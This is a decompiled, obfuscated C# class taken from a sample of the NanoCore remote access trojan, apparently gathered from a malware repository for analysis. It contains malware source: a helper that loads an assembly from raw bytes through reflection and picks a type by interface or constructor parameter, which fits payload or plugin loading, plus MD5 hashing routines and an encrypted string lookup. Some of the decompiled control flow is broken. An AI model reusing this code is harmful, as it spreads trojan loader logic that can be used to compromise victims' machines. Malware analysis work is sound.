// Decompiled with JetBrains decompiler
// Type: #=qxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU=
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 426FFF4D-C208-4BDC-B784-E45B84513C2D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan.MSIL.Agent.fpar-944bbcedd47e8498e6b07f90d34864e6c675706a34bb09df08204dd81365e507.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

[StandardModule]
internal sealed class \u0023\u003Dqxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU\u003D
{
  public static string \u0023\u003DqGjp0Vb6efONwANkcKrMTkIBxJvr9AleFfJriudyTw3c\u003D;

  static \u0023\u003Dqxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU\u003D()
  {
    string str = \u0023\u003DqnB6QgyVNIUL\u0024Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE\u003D.\u0023\u003Dq00kXQ\u00240a\u0024SV9DIgRtf4NWQ\u003D\u003D(516960737);
    if (false)
      return;
    \u0023\u003Dqxoz66kOqvxr21iYXZYXWiumy9eZGwFWaiX4C5X8aecU\u003D.\u0023\u003DqGjp0Vb6efONwANkcKrMTkIBxJvr9AleFfJriudyTw3c\u003D = str;
  }

  public static Type \u0023\u003DqKU0J1fiP8KA33eFK1owekQ\u003D\u003D(
    byte[] _param0,
    Type[] _param1,
    Type[] _param2)
  {
    Assembly assembly1 = Assembly.Load(_param0);
    if (true)
      goto label_3;
label_1:
    Assembly assembly2;
    Type[] types = assembly2.GetTypes();
    if (true)
      goto label_4;
label_2:
    int index;
    if (true)
      index = 0;
    Type[] typeArray;
    for (; index < typeArray.Length; ++index)
    {
      Type type1 = typeArray[index];
      foreach (Type type2 in type1.GetInterfaces())
      {
        if (Array.IndexOf<Type>(_param1, type2) != -1)
          return type1;
      }
      ConstructorInfo[] constructors = type1.GetConstructors();
      if (constructors.Length == 1)
      {
        foreach (ParameterInfo parameter in constructors[0].GetParameters())
        {
          if (Array.IndexOf<Type>(_param2, parameter.ParameterType) != -1)
            return type1;
        }
      }
    }
    return (Type) null;
label_4:
    typeArray = types;
    goto label_2;
label_3:
    assembly2 = assembly1;
    goto label_1;
  }

  public static byte[] \u0023\u003DqOicuy1VnndMMXIrDqqx3EA\u003D\u003D(string _param0)
  {
    MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
    if (true)
      goto label_2;
label_1:
    MD5CryptoServiceProvider cryptoServiceProvider2;
    return cryptoServiceProvider2.ComputeHash(Encoding.UTF8.GetBytes(_param0));
label_2:
    cryptoServiceProvider2 = cryptoServiceProvider1;
    goto label_1;
  }

  public static byte[] \u0023\u003Dq8d8q1KZbTCKTAZreko1Lug\u003D\u003D(byte[] _param0)
  {
    MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
    if (true)
      goto label_2;
label_1:
    MD5CryptoServiceProvider cryptoServiceProvider2;
    return cryptoServiceProvider2.ComputeHash(_param0);
label_2:
    cryptoServiceProvider2 = cryptoServiceProvider1;
    goto label_1;
  }

  public static string \u0023\u003DqJ598Vnr_RIwGnHqFfQsYCw\u003D\u003D(Stream _param0)
  {
    MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
    if (true)
      goto label_2;
label_1:
    MD5CryptoServiceProvider cryptoServiceProvider2;
    return BitConverter.ToString(cryptoServiceProvider2.ComputeHash(_param0)).Replace(\u0023\u003DqnB6QgyVNIUL\u0024Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE\u003D.\u0023\u003Dq00kXQ\u00240a\u0024SV9DIgRtf4NWQ\u003D\u003D(516957929), string.Empty);
label_2:
    cryptoServiceProvider2 = cryptoServiceProvider1;
    goto label_1;
  }

  public static string \u0023\u003DqiJXCsKWBF9DB88uzW4b92A\u003D\u003D(
    Stream _param0,
    int _param1,
    long _param2)
  {
    byte[] numArray1 = new byte[_param1 - 1 + 1];
    if (true)
      goto label_3;
label_1:
    MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
    if (true)
      goto label_4;
label_2:
    _param0.Position = 0L;
    byte[] numArray2;
    MD5CryptoServiceProvider cryptoServiceProvider2;
    int inputCount;
    do
    {
      long num1;
      int num2 = (int) Math.Min((long) numArray2.Length, _param2 - num1);
      if (true)
        goto label_7;
label_6:
      int count;
      inputCount = _param0.Read(numArray2, 0, count);
      cryptoServiceProvider2.TransformBlock(numArray2, 0, inputCount, (byte[]) null, 0);
      num1 += (long) inputCount;
      continue;
label_7:
      count = num2;
      goto label_6;
    }
    while (inputCount != 0);
    cryptoServiceProvider2.TransformFinalBlock(new byte[0], 0, 0);
    return BitConverter.ToString(cryptoServiceProvider2.Hash).Replace(\u0023\u003DqnB6QgyVNIUL\u0024Uq0GD3p5d7LpaFZvHrB3jSqhv3o7qlE\u003D.\u0023\u003Dq00kXQ\u00240a\u0024SV9DIgRtf4NWQ\u003D\u003D(516957929), string.Empty);
label_4:
    cryptoServiceProvider2 = cryptoServiceProvider1;
    goto label_2;
label_3:
    numArray2 = numArray1;
    goto label_1;
  }
}
